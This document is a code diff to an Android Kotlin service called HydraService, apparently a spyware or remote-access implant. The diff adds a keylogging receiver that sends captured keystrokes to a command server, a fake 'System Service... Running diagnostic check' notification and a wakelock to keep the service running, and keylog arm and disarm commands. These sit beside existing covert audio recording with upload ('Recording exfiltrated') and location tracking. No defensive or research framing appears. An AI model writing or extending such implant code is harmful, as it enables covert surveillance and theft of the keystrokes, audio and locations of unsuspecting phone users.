@@ -4,6 +4,7 @@ import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
+import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
@@ -16,9 +17,9 @@ import android.util.Log
 import android.widget.Toast
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
-import okhttp3.RequestBody.Companion.toRequestBody
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.RequestBody.Companion.asRequestBody
+import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
 import java.io.File
 import java.io.FileOutputStream
@@ -26,6 +27,8 @@ import java.io.IOException
 import java.security.SecureRandom
 import java.security.cert.X509Certificate
 import javax.net.ssl.*
+import java.net.HttpURLConnection
+import java.net.URL
 
 class HydraService : Service() {
     private val TAG = "Hydra"
@@ -34,7 +37,6 @@ class HydraService : Service() {
     private val handler = Handler(Looper.getMainLooper())
     private val heartbeatInterval = 60000L
     private var wakeLock: PowerManager.WakeLock? = null
-    //private val serverBaseUrl = "https://10.0.2.2:8443"
     private val serverBaseUrl = "https://192.168.0.207:8443"
 
     // --- Audio Surveillance VARIABLES ---
@@ -43,15 +45,39 @@ class HydraService : Service() {
     
     // --- LIVE TRACKING VARIABLES ---
     private var isTracking = false
-    private val trackingInterval = 30000L // 30 seconds
-    
-    // Initialize Location Helper
+    private val trackingInterval = 30000L 
     private val locationHelper by lazy { LocationHelper(this) }
 
     private val checkInRunnable = object : Runnable {
         override fun run() {
             performCheckIn()
             handler.postDelayed(this, heartbeatInterval)
+        }
+    }
+
+    // --- KEYLOG RECEIVER ---
+    private val keylogReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context?, intent: Intent?) {
+            val payload = intent?.getStringExtra("payload") ?: "Empty Payload" // Default if null
+            
+            val reportJson = JSONObject()
+            reportJson.put("type", "keylog")
+            reportJson.put("data", payload) // Use "data" to match server logic
+
+            val body = reportJson.toString().toRequestBody("application/json".toMediaType())
+            val request = Request.Builder()
+                .url("$serverBaseUrl/report/ANDROID-HEAD-01")
+                .post(body)
+                .build()
+
+            client.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
+                    Log.e(TAG, "[-] Exfil Failed: ${e.message}")
+                }
+                override fun onResponse(call: Call, response: Response) {
+                    response.close()
+                }
+            })
         }
     }
 
@@ -69,17 +95,52 @@ class HydraService : Service() {
 
     override fun onCreate() {
         super.onCreate()
+        
+        // 1. Setup Wakelock: Critical for Android 11 background persistence
         val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Hydra::C2WakeLock")
-        wakeLock?.acquire(10 * 60 * 1000L)
-    }
+        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Hydra::Wakelock")
+        // Keep it alive for 10 mins or until release
+        wakeLock?.acquire(10 * 60 * 1000L) 
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Log.i(TAG, "Ghost Service Started - Heartbeat active")
-        startMyForegroundService()
-        handler.removeCallbacks(checkInRunnable)
+        // 2. Start Foreground Notification (Mandatory for background survival)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel("hydra_service", "System Update", NotificationManager.IMPORTANCE_LOW)
+            val manager = getSystemService(NotificationManager::class.java)
+            manager?.createNotificationChannel(channel)
+        }
+        
+        val notification = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            Notification.Builder(this, "hydra_service")
+                .setContentTitle("System Service")
+                .setContentText("Running diagnostic check...")
+                .setSmallIcon(android.R.drawable.stat_notify_sync)
+                .build()
+        } else {
+            @Suppress("DEPRECATION")
+            Notification.Builder(this)
+                .setContentTitle("System Service")
+                .build()
+        }
+        
+        //Promote to foreground so the OS doesn't kill the BroadcastReceiver
+        startForeground(1, notification)
+
+        // 3. Register Keylog Receiver (The "Ear")
+        val filter = IntentFilter("com.hydra.ACTION_KEYLOG")
+        
+        // For Android 11, registerReceiver works normally, 
+        // but we keep the Tiramisu check for future-proofing.
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            registerReceiver(keylogReceiver, filter, Context.RECEIVER_EXPORTED)
+        } else {
+            registerReceiver(keylogReceiver, filter)
+        }
+
+        // 4. Start Heartbeat & Location logic
         handler.post(checkInRunnable)
-        return START_STICKY
+        handler.post(locationTrackingRunnable)
+        
+        Log.i(TAG, "Hydra Service Created - Keylog Receiver Active & Exported")
     }
 
     private fun startMyForegroundService() {
@@ -87,7 +148,7 @@ class HydraService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(channelId, "Hydra System Service", NotificationManager.IMPORTANCE_LOW)
             val manager = getSystemService(NotificationManager::class.java)
-            manager.createNotificationChannel(channel)
+            manager?.createNotificationChannel(channel)
         }
 
         val notification: Notification = Notification.Builder(this, channelId)
@@ -226,6 +287,17 @@ class HydraService : Service() {
                 Log.i(TAG, "[!] Action detected: $action")
 
                 when (action) {
+                    "keylog_start" -> {
+                        // Since we registered it in onCreate, it's already listening, 
+                        // but we can add a log or a flag here to confirm
+                        Log.i(TAG, "[+] Keylogging mission active")
+                        sendReport("status", "Keylogger is now armed")
+                    }
+                    "keylog_stop" -> {
+                        Log.i(TAG, "[-] Keylogging mission suspended")
+                        // Optionally unregister here if you want to be stealthy
+                        sendReport("status", "Keylogger has been disarmed")
+                    }
                     "record_start" -> {
                         currentRecordingPath = audioHelper.startRecording()
                         if (currentRecordingPath != null) {
@@ -235,7 +307,6 @@ class HydraService : Service() {
                     "record_stop" -> {
                         val finalPath = audioHelper.stopRecording()
                         if (finalPath != null) {
-                            // Automatically exfiltrate the file to the server
                             uploadFile(finalPath, "ANDROID-HEAD-01", serverBaseUrl)
                             sendReport("audio_status", "Recording exfiltrated: $finalPath")
                         }
@@ -313,6 +384,11 @@ class HydraService : Service() {
     override fun onDestroy() {
         handler.removeCallbacks(checkInRunnable)
         handler.removeCallbacks(locationTrackingRunnable)
+        try {
+            unregisterReceiver(keylogReceiver)
+        } catch (e: Exception) {
+            Log.e(TAG, "Receiver error during destroy")
+        }
         if (wakeLock?.isHeld == true) wakeLock?.release()
         super.onDestroy()
     }
